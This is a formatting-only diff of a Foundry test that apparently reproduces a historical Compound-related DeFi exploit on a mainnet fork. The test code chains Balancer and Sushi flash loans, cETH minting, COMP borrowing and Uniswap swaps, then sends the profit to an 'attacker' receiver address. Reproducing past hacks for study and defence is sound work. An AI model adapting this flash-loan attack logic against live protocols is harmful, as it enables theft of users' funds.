@@ -14,23 +14,33 @@ import "../basetest.sol";
 
 // @Analysis
 // Post-mortem : getherscan.io/tx/0x1106418384414ed56cd7cbb9fedc66a02d39b663d580abc618f2d387348354ab
-// Twitter Guy : 
-// Hacking God : 
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
 import "./../interface.sol";
 
 interface IComptroller {
-    function enterMarkets(address[] memory) external;
+    function enterMarkets(
+        address[] memory
+    ) external;
     function claimComp(address, address[] memory) external;
 }
 
 interface ICompoundToken {
-    function borrow(uint256 borrowAmount) external;
-    function repayBorrow(uint256 repayAmount) external;
-    function redeem(uint256 redeemAmount) external;
-    function mint(uint256 amount) external;
+    function borrow(
+        uint256 borrowAmount
+    ) external;
+    function repayBorrow(
+        uint256 repayAmount
+    ) external;
+    function redeem(
+        uint256 redeemAmount
+    ) external;
+    function mint(
+        uint256 amount
+    ) external;
     function comptroller() external view returns (address);
 }
 
@@ -72,50 +82,56 @@ contract GoodCompound is BaseTestWithBalanceLog {
     IERC20 ctoken = IERC20(ctoken_address);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 18_759_541-1);
-        deal(address(ctoken), address(this), 2240854452867); // initial tokens for setting ctoken snapshot
+        cheats.createSelectFork("mainnet", 18_759_541 - 1);
+        deal(address(ctoken), address(this), 2_240_854_452_867); // initial tokens for setting ctoken snapshot
         cheats.prank(profit_receiver);
         compound_token.approve(address(this), maxUint); // approve for transfer
     }
 
-
     function testExploit() public {
-        emit log_named_decimal_uint("[Begin] Attacker COMP before exploit", compound_token.balanceOf(profit_receiver), 18);
+        emit log_named_decimal_uint(
+            "[Begin] Attacker COMP before exploit", compound_token.balanceOf(profit_receiver), 18
+        );
         address[] memory path = new address[](2);
         path[0] = address(compound);
         path[1] = address(weth);
         uint256[] memory amounts = new uint256[](2);
-        amounts[0] = 894410483325707881040;
-        amounts[1] = 55693783410001174957472;
+        amounts[0] = 894_410_483_325_707_881_040;
+        amounts[1] = 55_693_783_410_001_174_957_472;
         balancer.flashLoan(address(this), path, amounts, "");
         emit log_named_decimal_uint("[End] Attacker COMP after exploit", compound_token.balanceOf(profit_receiver), 18);
     }
 
-    function receiveFlashLoan(address[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes calldata userData) external {
+    function receiveFlashLoan(
+        address[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes calldata userData
+    ) external {
         weth_token.withdraw(amounts[1]);
 
         bytes memory data1 = abi.encodeWithSignature("mint()");
-        (bool success1, ) = ceth.call{value: 450}(data1);
+        (bool success1,) = ceth.call{value: 450}(data1);
         require(success1, "Call failed");
 
         address[] memory markets = new address[](1);
         markets[0] = ceth;
         IComptroller(compound_comptroller).enterMarkets(markets);
-        ICompoundToken(ccompound_token).borrow(14995000000000000000000);
+        ICompoundToken(ccompound_token).borrow(14_995_000_000_000_000_000_000);
         // double flashloan
-        ISushiSwap(sushi).swap(4200000000000000000000, 0, address(this), "0x30");
+        ISushiSwap(sushi).swap(4_200_000_000_000_000_000_000, 0, address(this), "0x30");
 
-        IERC20(compound_token).approve(ccompound_token,maxUint);
-        ICompoundToken(ccompound_token).repayBorrow(14995000000000000000000);
+        IERC20(compound_token).approve(ccompound_token, maxUint);
+        ICompoundToken(ccompound_token).repayBorrow(14_995_000_000_000_000_000_000);
         ICompoundToken(ceth).redeem(ceth_token.balanceOf(address(this)));
         // deposit to exchange weth
         bytes memory data2 = abi.encodeWithSignature("deposit()");
-        (bool success2, ) = weth.call{value: 450 ether}(data2);
+        (bool success2,) = weth.call{value: 450 ether}(data2);
         require(success2, "Call failed");
 
         // payback
-        weth_token.transfer(balancer_vault, 55693783410001174957472);
-        compound_token.transfer(balancer_vault, 894410483325707881040);
+        weth_token.transfer(balancer_vault, 55_693_783_410_001_174_957_472);
+        compound_token.transfer(balancer_vault, 894_410_483_325_707_881_040);
         // transfer profit to a designated address
         compound_token.transfer(profit_receiver, compound_token.balanceOf(address(this)));
     }
@@ -124,7 +140,7 @@ contract GoodCompound is BaseTestWithBalanceLog {
         compound_token.approve(univ2_router, maxUint);
         weth_token.approve(univ2_router, maxUint);
 
-        compound_token.transferFrom(profit_receiver, address(this), 7400000000000000000);
+        compound_token.transferFrom(profit_receiver, address(this), 7_400_000_000_000_000_000);
         uint256 compound_balance = compound_token.balanceOf(address(this));
 
         address[] memory path = new address[](2);
@@ -151,13 +167,13 @@ contract GoodCompound is BaseTestWithBalanceLog {
         path3[1] = compound;
         univ2.swapExactTokensForTokens(weth_balance, 1, path3, address(this), block.timestamp << 1);
 
-        compound_token.transfer(sushi, 4206320627691200181954); // pay back
+        compound_token.transfer(sushi, 4_206_320_627_691_200_181_954); // pay back
 
         bytes memory data = abi.encodeWithSignature("deposit()");
-        (bool success, ) = weth.call{value: 55244 ether}(data);
+        (bool success,) = weth.call{value: 55_244 ether}(data);
         require(success, "Call failed");
 
-        weth_token.transfer(sushi, 149285130679667947); // calculated according to reserves
+        weth_token.transfer(sushi, 149_285_130_679_667_947); // calculated according to reserves
     }
 
     fallback() external payable {}
